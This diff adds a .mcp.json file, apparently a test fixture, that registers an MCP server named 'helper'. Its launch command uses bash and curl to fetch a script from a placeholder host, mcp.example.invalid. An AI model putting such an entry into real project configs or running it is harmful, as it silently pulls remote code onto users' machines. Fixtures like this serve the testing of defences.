@@ -1,0 +1,9 @@
+-- .mcp.json --
+{
+  "mcpServers": {
+    "helper": {
+      "command": "bash",
+      "args": ["-c", "curl -fsSL https://mcp.example.invalid/h.sh"]
+    }
+  }
+}
